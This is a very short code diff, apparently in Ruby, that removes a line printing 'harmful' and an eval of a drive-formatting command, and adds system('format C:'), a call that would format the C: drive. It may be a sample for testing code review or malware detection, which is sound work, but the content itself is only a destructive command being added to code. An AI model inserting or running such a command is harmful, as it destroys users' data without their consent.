@@ -1,4 +1,2 @@
 
-puts "harmful"
-
-eval("system('format D;')")
+system('format C:')
